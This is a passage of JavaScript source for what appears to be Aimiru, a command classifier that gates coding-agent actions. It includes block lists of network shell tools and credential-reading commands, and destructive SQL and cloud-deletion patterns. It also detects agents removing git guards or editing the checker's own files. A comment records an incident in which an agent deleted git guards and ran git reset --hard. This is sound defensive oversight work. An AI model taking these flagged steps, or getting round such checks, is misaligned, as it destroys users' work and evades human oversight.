  endSegment();
  return { segments, nested };
}

// ---------------------------------------------------------------------------
// Command classification
// ---------------------------------------------------------------------------

const WRAPPERS = new Set([
  'sudo', 'doas', 'env', 'nohup', 'time', 'command', 'exec', 'nice', 'ionice', 'caffeinate', 'stdbuf', 'unbuffer', 'builtin',
  'setsid', 'chronic', 'busybox', 'toybox', 'torsocks', 'proxychains', 'proxychains4',
  'then', 'do', 'else', 'if', 'while', 'until', '!', '{', '}',
]);
/**
 * Wrapper flags that take a value (getopt style: in "-abc" the first letter that takes a value
 * takes the rest of the word, or the next word when nothing is left). Without these, the value
 * would be read as the program: "timeout -s KILL 5 git push", "exec -a x git push".
 */
const WRAPPER_FLAGS = {
  sudo: { short: 'ugChprtUDRT', long: ['user', 'group', 'close-from', 'host', 'prompt', 'role', 'type', 'other-user', 'chdir', 'chroot', 'command-timeout'] },
  doas: { short: 'uC', long: [] },
  env: { short: 'uCPS', long: ['unset', 'chdir', 'split-string'] },
  exec: { short: 'a', long: [] },
  nice: { short: 'n', long: ['adjustment'] },
  ionice: { short: 'cnpPu', long: ['class', 'classdata', 'pid', 'pgid', 'uid'] },
  stdbuf: { short: 'ioe', long: ['input', 'output', 'error'] },
  caffeinate: { short: 'tw', long: [] },
  time: { short: 'fo', long: ['format', 'output'] },
  timeout: { short: 'sk', long: ['signal', 'kill-after'] },
  xargs: { short: 'IndPLEsa', long: ['arg-file', 'delimiter', 'max-args', 'max-procs', 'max-lines', 'max-chars', 'process-slot-var', 'eof'] },
  torsocks: { short: 'upaP', long: [] },
  proxychains: { short: 'f', long: [] },
  proxychains4: { short: 'f', long: [] },
};
const NO_FLAGS = { short: '', long: [] };
/** "NAME=value", "NAME+=value", "NAME[k]=value": a variable for the command, not the program. */
const ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*(\[[^\]]*\])?\+?=/;
/** Variables whose value is a command another program runs. */
const COMMAND_ENV_VARS = new Set([
  'GIT_SSH_COMMAND', 'GIT_SSH', 'GIT_PAGER', 'PAGER', 'GIT_EDITOR', 'EDITOR', 'VISUAL', 'GIT_SEQUENCE_EDITOR', 'GIT_EXTERNAL_DIFF',
  'GIT_ASKPASS', 'SSH_ASKPASS', 'SUDO_ASKPASS', 'GIT_PROXY_COMMAND', 'PROMPT_COMMAND', 'MANPAGER', 'LESSOPEN', 'LESSCLOSE',
  'SYSTEMD_PAGER', 'BAT_PAGER', 'DELTA_PAGER', 'BROWSER',
]);
/** Programs that run their arguments as command text. */
const EVAL_PROGRAMS = new Set(['eval', 'iex', 'invoke-expression']);
/** Deeper than this, nested commands are not read; the command is then treated as unknown. */
const MAX_DEPTH = 6;
const SHELLS = new Set(['bash', 'sh', 'zsh', 'dash', 'ksh', 'fish']);
const NET_CLIENTS = new Set(['curl', 'wget', 'http', 'https', 'xh', 'httpie', 'aria2c', 'invoke-webrequest', 'invoke-restmethod', 'iwr', 'irm']);
const INLINE_INTERPRETERS = new Set(['python', 'python3', 'node', 'ruby', 'perl', 'php', 'deno', 'bun']);
const NETWORK_PROGRAMS = new Set([
  'nc', 'ncat', 'netcat', 'telnet', 'ftp', 'ssh', 'mosh', 'ping', 'dig', 'nslookup', 'host', 'traceroute', 'whois',
  'npx', 'pnpx', 'bunx', 'pipx', 'brew', 'apt', 'apt-get', 'dnf', 'yum', 'pacman', 'apk', 'port', 'snap', 'winget', 'choco', 'scoop',
]);
const INSTALL_SUBCOMMANDS = {
  npm: ['install', 'i', 'ci', 'add', 'update', 'upgrade', 'exec', 'x', 'create', 'init', 'dlx'],
  pnpm: ['install', 'i', 'add', 'update', 'up', 'dlx', 'create', 'exec'],
  yarn: ['install', 'add', 'upgrade', 'up', 'dlx', 'create', ''],
  bun: ['install', 'i', 'add', 'update', 'x', 'create'],
  pip: ['install', 'download'],
  pip3: ['install', 'download'],
  uv: ['pip', 'add', 'sync', 'tool', 'run', 'lock'],
  poetry: ['add', 'install', 'update', 'lock'],
  conda: ['install', 'create', 'update'],
  mamba: ['install', 'create', 'update'],
  cargo: ['install', 'add', 'update', 'fetch'],
  go: ['install', 'get', 'mod'],
  gem: ['install', 'update', 'fetch'],
  bundle: ['install', 'update'],
  composer: ['install', 'require', 'update'],
  docker: ['pull', 'run', 'build', 'compose', 'buildx'],
  podman: ['pull', 'run', 'build'],
  git: ['clone', 'fetch', 'pull', 'ls-remote', 'submodule', 'remote'],
  deno: ['install', 'add', 'run'],
};
const PUBLISH = {
  npm: ['publish', 'unpublish', 'deprecate', 'dist-tag'],
  pnpm: ['publish'],
  yarn: ['publish', 'npm'],
  bun: ['publish'],
  cargo: ['publish', 'yank'],
  twine: ['upload'],
  poetry: ['publish'],
  uv: ['publish'],
  gem: ['push', 'yank'],
  docker: ['push'],
  podman: ['push'],
  helm: ['push'],
  flyctl: ['deploy'],
  fly: ['deploy'],
  wrangler: ['deploy', 'publish'],
  firebase: ['deploy'],
  netlify: ['deploy'],
  vercel: ['deploy', '--prod'],
  railway: ['up', 'deploy'],
  heroku: ['releases:rollback'],
  serverless: ['deploy'],
  sls: ['deploy'],
  amplify: ['publish', 'push'],
  eas: ['submit', 'update'],
  fastlane: ['deliver', 'pilot', 'supply'],
  expo: ['publish'],
  vsce: ['publish'],
  ovsx: ['publish'],
};
const LOGIN_COMMANDS = {
  gh: [['auth', 'login'], ['auth', 'token'], ['auth', 'refresh'], ['auth', 'setup-git']],
  npm: [['login'], ['adduser'], ['token']],
  pnpm: [['login']],
  yarn: [['npm', 'login']],
  docker: [['login']],
  podman: [['login']],
  helm: [['registry', 'login']],
  aws: [['configure'], ['sso', 'login'], ['ecr', 'get-login-password'], ['sts', 'get-session-token']],
  gcloud: [['auth'], ['config', 'set', 'account']],
  az: [['login'], ['account', 'get-access-token']],
  firebase: [['login']],
  vercel: [['login']],
  netlify: [['login']],
  heroku: [['login'], ['auth:token']],
  stripe: [['login']],
  supabase: [['login']],
  wrangler: [['login']],
  fly: [['auth']],
  flyctl: [['auth']],
  op: [['signin'], ['read'], ['item', 'get'], ['inject']],
  bw: [['unlock'], ['get'], ['login']],
  lpass: [['show'], ['login']],
  vault: [['login'], ['read'], ['kv', 'get']],
  git: [['credential'], ['config', 'credential.helper']],
  claude: [['setup-token']],
};
const DB_CLIENTS = new Set(['psql', 'mysql', 'mariadb', 'sqlite3', 'mongosh', 'mongo', 'redis-cli', 'sqlcmd', 'clickhouse-client', 'snowsql', 'bq', 'cqlsh', 'duckdb', 'supabase', 'turso', 'neonctl', 'planetscale', 'pscale']);
const SQL_DESTRUCTIVE = /\b(drop\s+(database|table|schema|index|view|user|role)|truncate\s+(table\s+)?\w+|delete\s+from|flushall|flushdb|dropdatabase|\.drop\(\)|deletemany)\b/i;

// ---------------------------------------------------------------------------
// What a coding agent does beyond its files (ADR-0039): deploys, package publishes, force pushes and
// dropped databases are named by resource, so a rule ("Never let any agent force push") can match
// them whatever class the step has. Pattern matching on the command and the tool name only, never
// the classifier (D3). The class is unchanged, so Safe Start answers exactly as before.
// ---------------------------------------------------------------------------

export const BUILDER_RESOURCES = Object.freeze({
  deploy: 'code.deploy',
  publish: 'code.publish',
  forcePush: 'code.force_push',
  dbDrop: 'code.db_drop',
});
/** Tools in PUBLISH that put a site, an app or a worker live: a deploy. The rest publish a package or an image. */
const DEPLOY_TOOLS = new Set(['flyctl', 'fly', 'wrangler', 'firebase', 'netlify', 'vercel', 'railway', 'heroku', 'serverless', 'sls', 'amplify', 'eas', 'expo', 'fastlane']);
/** Statements that drop a database, a schema or a table, or empty one: not a row delete, an index or a role. */
const SQL_DROP = /\b(drop\s+(database|table|schema)|truncate\s+(table\s+)?\w+|flushall|flushdb|dropdatabase|\.drop\(\))/i;

/** Framework tasks that drop or rebuild a database: rails db:drop, rake db:reset, ... */
const DB_TASK = /^db:(drop|reset|purge|schema:load|migrate:reset|truncate_all)(:|$)/i;

/**
 * The builder resource of a program run with these arguments, with the class it has at least, or
 * null. Used for the program itself and for a package run through npx, bunx, pnpm dlx or yarn dlx.
 */
function builderStep(prog, args) {
  const lower = args.map((a) => String(a).toLowerCase());
  const first = firstNonFlag(args);
  const subs = PUBLISH[prog];
  if (subs && (subs.includes(first) || (prog === 'vercel' && args.includes('--prod')))) {
    if (DEPLOY_TOOLS.has(prog)) return { cls: 'send', resource: BUILDER_RESOURCES.deploy };
    // "yarn npm login" is in the table for its class; only "yarn npm publish" publishes a package.
    if (prog === 'yarn' && first === 'npm' && !lower.includes('publish')) return null;
    return { cls: 'send', resource: BUILDER_RESOURCES.publish };
  }
  if ((prog === 'rails' || prog === 'rake') && args.some((a) => DB_TASK.test(String(a)))) {
    return { cls: 'delete', resource: BUILDER_RESOURCES.dbDrop };
  }
  if (prog === 'prisma' && (hasSeq(args, ['migrate', 'reset']) || (hasSeq(args, ['db', 'push']) && lower.includes('--force-reset')))) {
    return { cls: 'delete', resource: BUILDER_RESOURCES.dbDrop };
  }
  return null;
}

/**
 * The repository an address names, as a push's counterparty (CONTRACT.md, `git push`; ADR-0146):
 * the lower-case host and path, without .git and with any sign-in removed ("github.com/owner/repo",
 * from the https, ssh://, git:// and git@github.com:owner/repo.git forms, a remote helper's
 * "<helper>::<address>" too), or "folder:<name>" for a repository in a folder on this computer (a
 * path, or a file: address). `cwd` places a relative path ("." or ".."). Null when it cannot be read.
 */
export function repositoryOf(address, { cwd = null } = {}) {
  let a = String(address ?? '').trim();
  if (!a || /[\s$`]/.test(a)) return null;
  const helper = /^([a-z][a-z0-9+.-]*)::(.+)$/i.exec(a);
  if (helper) {
    // git's ext:: and fd:: run a program or use an open file: they name no repository.
    if (/^(ext|fd)$/i.test(helper[1])) return null;
    a = helper[2];
  }
  const hostPath = (host, p) => {
    const h = String(host ?? '').toLowerCase().replace(/^\[(.*)\]$/, '$1');
    if (!h) return null;
    const rest = String(p ?? '').split(/[\\/]+/).filter(Boolean).join('/').replace(/\.git$/i, '').toLowerCase();
    return rest ? `${h}/${rest}` : h;
  };
  const folder = (p) => {
    const where = cwd && !path.isAbsolute(p) && !/^~(\/|$)/.test(p) && !/^[A-Za-z]:[\\/]/.test(p) ? path.resolve(cwd, p) : p;
    // The folder's own name, with either separator (a Windows path too), and a repository's .git
    // folder read as the repository.
    const parts = String(where).split(/[\\/]+/).filter(Boolean);
    if (parts.length > 1 && /^\.git$/i.test(parts.at(-1))) parts.pop();
    const name = String(parts.at(-1) ?? '').replace(/\.git$/i, '').toLowerCase();
    return name && name !== '.' && name !== '..' && name !== '~' ? `folder:${name}` : null;
  };
  if (/^file:\/\//i.test(a)) {
    try {
      return folder(decodeURIComponent(new URL(a).pathname));
    } catch {
      return null;
    }
  }
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(a)) {
    try {
      const u = new URL(a);
      return hostPath(u.hostname, u.pathname);
    } catch {
      return null;
    }
  }
  const scp = scpAddress(a);
  if (scp) return hostPath(scp.host, scp.path);
  return folder(a);
}

/**
 * git's short ssh form, [user@]host:path, only when no slash comes before the first colon (git's own
 * rule, so a folder whose name has a colon is a folder) and the host is not a Windows drive letter.
 */
function scpAddress(word) {
  const m = /^(?:[^@/:]+@)?(\[[^\]]+\]|[^:/]+):(.*)$/s.exec(String(word ?? ''));
  if (!m || /^[A-Za-z]$/.test(m[1])) return null;
  return { host: m[1], path: m[2] };
}

/** git push's options whose value is the next word. */
const PUSH_VALUE_OPTIONS = new Set(['--repo', '-o', '--push-option', '--receive-pack', '--exec', '--recurse-submodules']);

/**
 * Where one git push goes (CN7), from its words after "push": {target} when the command names the
 * repository by its address (with that address and the folder, {target, address, dir}); {remote,
 * dir} when git looks it up (a remote's name, a folder, or nothing, which is the branch's own
 * remote), for the connector to ask git (newness.mjs namePushTarget); {unknown: true} when Aimiru
 * cannot tell (a word built when it runs, a push into submodules, or the folder or git's settings for
 * this one command are not known).
 */
function pushDestination(words, dyn, dir) {
  let named = null;
  let namedDyn = false;
  let repo = null;
  let repoDyn = false;
  // A push that also pushes submodules sends code to their repositories too.
  let submodules = false;
  const recurses = (v, d) => d || /^(on-demand|only)$/i.test(String(v ?? ''));
  for (let k = 0; k < words.length; k += 1) {
    const w = String(words[k]);
    if (w === '--') {
      if (k + 1 < words.length) {
        named = String(words[k + 1]);
        namedDyn = Boolean(dyn[k + 1]);
      }
      break;
    }
    const glued = /^--repo=(.*)$/s.exec(w);
    if (glued) {
      repo = glued[1];
      repoDyn = Boolean(dyn[k]);
      continue;
    }
    const gluedRecurse = /^--recurse-submodules=(.*)$/s.exec(w);
    if (gluedRecurse) {
      submodules ||= recurses(gluedRecurse[1], dyn[k]);
      continue;
    }
    if (PUSH_VALUE_OPTIONS.has(w)) {
      if (w === '--repo') {
        repo = words[k + 1] ?? null;
        repoDyn = Boolean(dyn[k + 1]);
      }
      if (w === '--recurse-submodules') submodules ||= recurses(words[k + 1], dyn[k + 1]);
      k += 1;
      continue;
    }
    if (w.startsWith('-') && w !== '-') continue;
    named = w;
    namedDyn = Boolean(dyn[k]);
    break;
  }
  if (submodules) return { unknown: true };
  // The repository on the command line wins over --repo, as git reads them.
  const word = named ?? repo;
  if (word !== null && (named !== null ? namedDyn : repoDyn)) return { unknown: true };
  if (word !== null && (/^[a-z][a-z0-9+.-]*:\/\//i.test(word) || /^[a-z][a-z0-9+.-]*::/i.test(word) || scpAddress(word))) {
    const target = repositoryOf(word);
    // The address as written, and the folder git runs in, for the connector to apply git's own
    // address rewriting (url.<base>.insteadOf), which can send it somewhere else.
    return target ? { target, address: word, dir } : { unknown: true };
  }
  if (!dir) return { unknown: true };
  return { remote: word, dir };
}

/** git push that overwrites what is on the other side: --force, -f, --force-with-lease, --mirror or a +refspec. */
export function isForcePush(words) {
  return words.some((a) => {
    const w = String(a ?? '');
    if (/^--(force|force-with-lease|force-if-includes|mirror)(=|$)/.test(w)) return true;
    if (/^-[a-zA-Z0-9]*f[a-zA-Z0-9]*$/.test(w) && !w.startsWith('--')) return true;
    return /^\+[^\s]/.test(w);
  });
}
/**
 * The founder's incident steps (ADR-0111; 20 Oct 2026, VERIFY-LOG.md:121-122: an agent deleted the
 * git guards, committed 166 files and ran `git reset --hard HEAD~1`). Named by resource, as the
 * builder steps are, so a rule ("Never let any agent throw away my uncommitted work") can match
 * them; read inside the project they were local work before, decided with no question.
 *   discardWork: a whole-tree discard of uncommitted work (git reset --hard, git clean -fd or -fx,
 *                git checkout -- ., git restore ., git checkout -f, git stash drop and clear).
 *   removeGuard: removing, moving, emptying or turning off a git guard (a file under .git/hooks, the
 *                folder itself or the whole .git folder), changing core.hooksPath, or skipping the
 *                guards for one step (--no-verify).
 * Both are class delete: Safe Start has no rule for them, so they ask, and they wait when Aimiru
 * cannot be asked, as any deletion does.
 */
export const INCIDENT_RESOURCES = Object.freeze({
  discardWork: 'code.discard_work',
  removeGuard: 'code.remove_guard',
});

/** When one command does several builder steps, the one a rule most needs to see: a force push first. */
const BUILDER_RANK = [BUILDER_RESOURCES.forcePush, BUILDER_RESOURCES.dbDrop, INCIDENT_RESOURCES.discardWork, INCIDENT_RESOURCES.removeGuard, BUILDER_RESOURCES.deploy, BUILDER_RESOURCES.publish];

/** One incident step (ADR-0111): a deletion that names its resource, kept as a part of the command. */
function nameIncidentStep(out, resource, why) {
  out.classes.push('delete');
  nameBuilderStep(out, resource);
  out.why.push(why);
}

/**
 * Programs that only search or show text: naming a setting there changes nothing (what they write is
 * read as a redirection). Never a program that can write a file itself (security review, 28 Oct):
 * git (git config -f, --output) and less (-o, -O, and its commands) are not here.
 */
const SHOWS_TEXT_ONLY = new Set(['grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'cat', 'more', 'head', 'tail', 'bat', 'wc', 'jq', 'echo', 'printf']);

/** One step guardShellStep or guardRedirect found: an incident step, or (resource null) unknown. */
function incidentOrUnknown(out, step) {
  if (step.resource) nameIncidentStep(out, step.resource, step.why);
  else unknownProgram(out, step.why);
}

/**
 * A change (a write, an edit, a move or a delete) to the maker's settings or Aimiru's own files
 * (isProtectedPath; CONTRACT.md, the protected-paths row). An agent that makes one could turn off the
 * check that holds it, so it is named as a git guard's removal is: class delete with
 * code.remove_guard, which start set 2 asks about (code.ask_cannot_undo), marked sensitive so it is
 * held when Aimiru cannot be asked.
 */
function protectedChange(out, why) {
  nameIncidentStep(out, INCIDENT_RESOURCES.removeGuard, why);
  out.sensitive = true;
}

/** Aimiru's setup programs for Codex, by every name they were published or run under. */
const AIMIRU_SETUP_PROGRAMS = new Set(['aimiru-codex', 'sayso-codex', 'aimiru-codex.mjs', 'sayso-codex.mjs']);

/**
 * True when a run of Aimiru's Codex setup program rewrites Codex's check (review of
 * wk/connectors-flow, 28 Oct): init (it rewrites the entry in hooks.json, which Codex then skips until
 * it is trusted again, and can pair another key) and uninstall (it takes the check out). Its first
 * word that is not an option decides; one built when the command runs may be either. doctor only reads.
 * @param {string} name   the program, or the package npx and its kin run (no version)
 * @param {string[]} rest the words after it
 * @param {boolean[]} restDyn per word, built when the command runs
 */
function changesAimiruSetup(name, rest, restDyn = []) {
  if (!AIMIRU_SETUP_PROGRAMS.has(String(name ?? '').toLowerCase())) return false;
  const k = rest.findIndex((w) => !String(w).startsWith('-'));
  if (k === -1) return false;
  return Boolean(restDyn[k]) || ['init', 'uninstall'].includes(String(rest[k]).toLowerCase());
}

/** Keeps the highest ranked builder step a command does, apart from any other resource it names. */
function nameBuilderStep(out, resource) {
  if (!resource) return;
  // Its class is the one the step just added (send for a deploy or a push, delete for a dropped database).
  notePart(out, out.classes[out.classes.length - 1] || 'other', resource);
  out.builderSteps = (out.builderSteps || 0) + 1;
  if (!out.builder || BUILDER_RANK.indexOf(resource) < BUILDER_RANK.indexOf(out.builder)) out.builder = resource;
}

/** A step of the same kind that names nothing itself (a plain git push): not "something else" either. */
function codeStep(out) {
  out.builderSteps = (out.builderSteps || 0) + 1;
}

/** Classes that wait when Aimiru cannot be asked: a step of one of these is something an agent does. */
const CONSEQUENTIAL = new Set(['spend', 'send', 'share', 'book', 'delete', 'login']);

/**
 * Classes whose family the grants and Safe Start read when nothing else is named (money for spend
 * and book, personal details for share): a builder step in the same command never stands in for
 * them, so "vercel deploy && curl <payment>" stays a payment checked as money.
 */
const KEEP_FAMILY_CLASSES = new Set(['read', 'spend', 'book', 'share']);

/**
 * The builder resource an action carries (ADR-0039): only when it names no other resource (a card,
 * an email, a personal detail always wins, as before) and its class is not money or a share.
 */
export function builderResourceFor(cls, builder, otherSteps = false) {
  return builder && !otherSteps && !KEEP_FAMILY_CLASSES.has(cls) ? builder : null;
}

/**
 * What a deletion of files on this computer outside the work area names (rm, rmdir, unlink, trash,
 * find -delete, shred, a disk erase): the person's data, so Safe Start's "Never delete my data"
 * (class delete, resource data.*) and the person's own rules about deleting files can match it.
 * Live run, 22 Oct 2026: `rm -rf` on a folder outside the project named nothing and was asked about.
 */
export const FILE_DELETE_RESOURCE = 'data.files';

/**
 * What a file Claude Code writes or edits where it works (the project, or a temporary folder) names.
 * It stays local work, class read, so the person's read rule still covers it and nobody is asked
 * about each edit; the resource lets Aimiru word it as a change to files where the agent works
 * instead of "can read something" (live run, 22 Oct 2026). Aimiru never needs a grant for it.
 */
export const LOCAL_WORK_RESOURCE = 'code.local';

/**
 * Folders whose files programs rebuild by themselves: the home folder's .cache (where Linux tools
 * and many others keep theirs) and macOS's Library/Caches (which macOS empties on its own), and the
 * temp folders as a whole. Deleting them is not deleting the person's data, so it names nothing and
 * Aimiru asks, as before; a never rule, which cannot be answered yes, does not refuse it. A path
 * inside a temp folder is local work and never reaches this. Anything else under the home folder,
 * a folder named like a cache included, is the person's files as far as the command shows.
 */
function isRebuiltByPrograms(p, ctx) {
  if (!p) return false;
  if (isWithin(p, path.join(ctx.home, '.cache')) || isWithin(p, path.join(ctx.home, 'Library', 'Caches'))) return true;
  return ctx.temps.includes(p);
}

/**
 * What one deletion step deletes outside the work area, from its targets (resolved paths, null for
 * one known only when the command runs): 'data' when any is a known path of the person's files,
 * else 'unknown' when any is not known, else 'rebuilt' (only the folders above).
 */
function deleteKind(paths, ctx) {
  if (paths.some((p) => p && !isRebuiltByPrograms(p, ctx))) return 'data';
  return paths.some((p) => !p) ? 'unknown' : 'rebuilt';
}

/** One step that deletes files or data outside the work area, and what it deletes (deleteKind). */
function deletesFiles(out, kind) {
  out.classes.push('delete');
  if (kind === 'data') notePart(out, 'delete', FILE_DELETE_RESOURCE);
  out.fileDeletes = (out.fileDeletes || 0) + 1;
  if (kind === 'data') out.dataDeletes = (out.dataDeletes || 0) + 1;
}

/**
 * What a deletion of cloud or server data names (ADR-0090): terraform destroy and apply -destroy,
 * kubectl delete, helm uninstall, docker system prune and volume rm, a cloud command line's delete
 * step (aws, gcloud, az, fly, railway and the others in CLOUD_CLIS), and a DELETE request to a
 * cloud provider's address. The person's data, so Safe Start's "Never delete my data" (class
 * delete, resource data.*) refuses it in its own words instead of asking. Only a step Aimiru reads
 * as a deletion by its verb in its place names it; a delete word anywhere else in the command
 * ("--name delete-me") keeps the class, names nothing and is asked about, as before.
 */
export const CLOUD_DELETE_RESOURCE = 'data.cloud';

/**
 * What running a program the agent wrote names (ADR-0090): a file run by an interpreter (node,
 * python, bash, sh, bun, ruby, tsx, ...) or run by its path, that is not in the last commit
 * (untracked, changed since, or outside any repository). With Claude Code's sandbox off it is
 * asked about (class other); with the sandbox on, or once the person allowed that same file in
 * this session, it is local work (class read) and still named, so the Record says what ran.
 */
export const NEW_PROGRAM_RESOURCE = 'code.new_program';

/**
 * data.files or data.cloud for a command whose consequential steps are all deletions of one kind:
 * data.files when at least one deletes known files of the person's (a never rule cannot be
 * answered yes, so a deletion Aimiru cannot read is asked about instead), data.cloud when they are
 * cloud deletions. Null when it also pays, sends, shares, books, signs in, deletes something else
 * (a database), deletes both files and cloud data, or runs a program Aimiru does not know or the
 * agent just wrote, so a rule about deleting one kind of data never carries another step along.
 */
function dataDeleteResourceFor(cls, out) {
  if (cls !== 'delete' || out.unknownProgram || out.newProgram) return null;
  const steps = out.classes.filter((c) => CONSEQUENTIAL.has(c)).length;
  if (steps !== out.fileDeletes + out.cloudDeletes) return null;
  if (out.cloudDeletes && !out.fileDeletes) return CLOUD_DELETE_RESOURCE;
  if (out.fileDeletes && !out.cloudDeletes && out.dataDeletes) return FILE_DELETE_RESOURCE;
  return null;
}

/** One step that deletes cloud or server data (data.cloud). */
function deletesCloudData(out, why) {
  out.classes.push('delete');
  notePart(out, 'delete', CLOUD_DELETE_RESOURCE);
  out.cloudDeletes = (out.cloudDeletes || 0) + 1;
  out.why.push(why);
}

/**
 * Cloud providers' own addresses: a DELETE request to one deletes cloud data. Suffixes: the host
 * itself or any name under it.
 */
const CLOUD_HOSTS = [
  'amazonaws.com', 'googleapis.com', 'management.azure.com', 'core.windows.net', 'azure.com', 'digitalocean.com',
  'digitaloceanspaces.com', 'fly.io', 'machines.dev', 'railway.app', 'railway.com', 'heroku.com', 'vercel.com',
  'netlify.com', 'cloudflare.com', 'cloudflarestorage.com', 'supabase.co', 'supabase.com', 'render.com', 'linode.com',
  'hetzner.cloud', 'vultr.com', 'scaleway.com', 'oraclecloud.com', 'cloud.ibm.com', 'neon.tech', 'planetscale.com',
  'upstash.com', 'upstash.io', 'turso.tech', 'turso.io', 'firebaseio.com', 'mongodb.com', 'mongodb-api.com',
  'backblazeb2.com', 'wasabisys.com', 'convex.cloud', 'appwrite.io', 'nhost.run',
];

/** True for a cloud provider's address (CLOUD_HOSTS). */
export function isCloudHost(host) {
  const h = String(host || '').toLowerCase().replace(/\.$/, '');
  return Boolean(h) && CLOUD_HOSTS.some((d) => h === d || h.endsWith(`.${d}`));
}

/** Options of cloud command lines that take a value, so the value is never read as a step. */
const CLOUD_VALUE_OPTS = new Set([
  '-n', '--namespace', '--context', '--kube-context', '--kubeconfig', '--cluster', '--user', '-s', '--server', '--profile',
  '--region', '--endpoint-url', '--output', '-o', '--query', '--project', '--zone', '--account', '--configuration',
  '--subscription', '-g', '--resource-group', '--app', '-a', '--config', '-c', '--org', '--team', '--scope', '-e',
  '--env', '--environment', '--service', '-H', '--host', '--log-level', '--format', '--chdir', '--stack', '--cwd',
]);

/** Long options of cloud command lines that take no value, so the word after one is still read. */
const CLOUD_SWITCHES = new Set([
  '--yes', '--quiet', '--verbose', '--debug', '--force', '--all', '--recursive', '--no-wait', '--async', '--dry-run',
  '--json', '--wait', '--detach', '--purge', '--cascade', '--now', '--ignore-not-found', '--no-color', '--no-prompt',
  '--auto-approve', '--insecure', '--help', '--version', '--interactive', '--confirm', '--no-input', '--skip-confirmation',
]);

/**
 * A cloud command line's steps: its words that are not options, nor the value of one. In the
 * general reading (otherOptsTakeValues), an unknown long option is read with the word after it as
 * its value (ADR-0090 review: az storage blob list --container-name delete is a list); a delete step
 * after such an option is then still a deletion, asked about instead of refused.
 */
function cloudSteps(args, { otherOptsTakeValues = false } = {}) {
  const steps = [];
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k]);
    if (a === '--') break;
    if (a.startsWith('-')) {
      if (a.includes('=')) continue;
      if (CLOUD_VALUE_OPTS.has(a)) k += 1;
      else if (otherOptsTakeValues && a.startsWith('--') && !CLOUD_SWITCHES.has(a) && args[k + 1] !== undefined && !String(args[k + 1]).startsWith('-')) k += 1;
      continue;
    }
    steps.push(a.toLowerCase());
  }
  return steps;
}

/** The delete steps of most cloud command lines (gcloud sql instances delete, fly apps destroy, az group delete). */
const CLOUD_DELETE_STEPS = new Set(['delete', 'destroy', 'rm', 'rb', 'del', 'terminate', 'purge', 'deprovision']);

/**
 * True when a cloud command line deletes cloud or server data, read from the step in its place
 * (ADR-0090). gh and glab are code hosting, not cloud data, and are read where they are.
 */
function isCloudDeletion(prog, args) {
  const steps = cloudSteps(args);
  const [a, b] = steps;
  switch (prog) {
    case 'terraform':
    case 'tofu':
      return a === 'destroy' || (a === 'apply' && args.some((x) => /^--?destroy$/.test(String(x))));
    case 'pulumi':
      return a === 'destroy';
    case 'kubectl':
      return a === 'delete';
    case 'helm':
      return ['uninstall', 'delete', 'del', 'un'].includes(a);
    case 'docker':
    case 'podman':
      return (
        (a === 'system' && b === 'prune') ||
        (a === 'volume' && ['rm', 'remove', 'prune'].includes(b)) ||
        (a === 'compose' && steps.includes('down') && args.some((x) => /^(-v|--volumes)$/.test(String(x))))
      );
    case 'aws':
      return (a === 's3' && (b === 'rm' || b === 'rb')) || /^(delete|terminate|purge|destroy)(-|$)/.test(b ?? '');
    case 'gsutil':
    case 'mc':
      return a === 'rm' || a === 'rb';
    case 's3cmd':
      return ['del', 'rm', 'rb'].includes(a);
    case 'eksctl':
      return a === 'delete';
    case 'rclone':
      // Only what it deletes on a remote ("name:path"); a folder on this computer is read as files.
      return ['delete', 'deletefile', 'purge', 'rmdir', 'rmdirs'].includes(a) && steps.slice(1).some((w) => /^[a-z0-9_.-]+:/i.test(w) && !/^[a-z]:[\\/]/i.test(w));
    case 'railway':
      return steps.slice(0, 3).some((w) => ['down', 'delete', 'destroy', 'rm'].includes(w));
    case 'heroku':
    case 'firebase':
    case 'netlify':
      return a === 'destroy' || steps.slice(0, 2).some((w) => /^[a-z-]+:(destroy|delete|remove|reset)$/.test(w));
    case 'gh':
    case 'glab':
      return false;
    default:
      return cloudSteps(args, { otherOptsTakeValues: true }).slice(0, 5).some((w) => CLOUD_DELETE_STEPS.has(w));
  }
}

// ---------------------------------------------------------------------------
// Deploy targets (ADR-0090): a make target or a package script named deploy, release, publish or
// ship is a deploy (code.deploy), so the person's rule about deploys answers it.
// ---------------------------------------------------------------------------

const SHIP_WORDS = new Set(['deploy', 'release', 'publish', 'ship']);

/** True for a target or script named deploy, release, publish or ship ("deploy:prod", "release-patch"), by its leading word. */
export function isShipName(name) {
  // The leading word only (ADR-0090 review): build:release and test-publish are local work.
  const lead = String(name ?? '').toLowerCase().split(/[^a-z0-9]+/).find(Boolean);
  return Boolean(lead) && SHIP_WORDS.has(lead);
}

/** make's options that take a value (glued or the next word); -j and -l take one only when it is a number. */
const MAKE_VALUE_OPTS = new Set(['-C', '-f', '-I', '-o', '-W', '-E', '--file', '--makefile', '--directory', '--include-dir', '--old-file', '--assume-old', '--what-if', '--new-file', '--assume-new', '--eval']);

/** The targets a make command names: its words that are not options, option values or NAME=value. */
function makeTargets(args) {
  const targets = [];
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k]);
    if (a === '--') continue;
    if (a.startsWith('-')) {
      if (MAKE_VALUE_OPTS.has(a)) k += 1;
      else if ((a === '-j' || a === '-l' || a === '--jobs' || a === '--load-average') && /^\d+(\.\d+)?$/.test(String(args[k + 1] ?? ''))) k += 1;
      continue;
    }
    if (ASSIGNMENT_RE.test(a)) continue;
    targets.push(a);
  }
  return targets;
}

/** The step one deploy target names, as a builder step of class send (as vercel deploy is). */
function deployTarget(out, what) {
  out.classes.push('send');
  nameBuilderStep(out, BUILDER_RESOURCES.deploy);
  out.why.push(`runs ${what}, which deploys or releases`);
}

// ---------------------------------------------------------------------------
// Programs the agent wrote (ADR-0090). A program run from a file in the project is local work when
// the file is in the commit the session began with; otherwise it is new: the agent may have just
// written it, and what it does is not on the command line. Newness is the gate: what the file says
// only adds hints to the question, and never allows anything. Which programs are new is told by the
// connector's newness check (newness.mjs).
// ---------------------------------------------------------------------------

/** Glob characters and brace lists: the shell picks the file, so Aimiru cannot tell which one runs. */
const GLOB_WORD = /[*?[]|\{[^}]*(,|\.\.)[^}]*\}/;

/**
 * Notes a program a command runs from a file inside the project, for the newness check (ADR-0090).
 * `kind` says how the program that runs it looks the file up (newness.mjs resolveProgramFile): node,
 * bun (TypeScript runners too), python, makefile, scripts (a package.json's scripts) or plain.
 * Nothing is noted without a newness check in the context (makePathContext).
 */
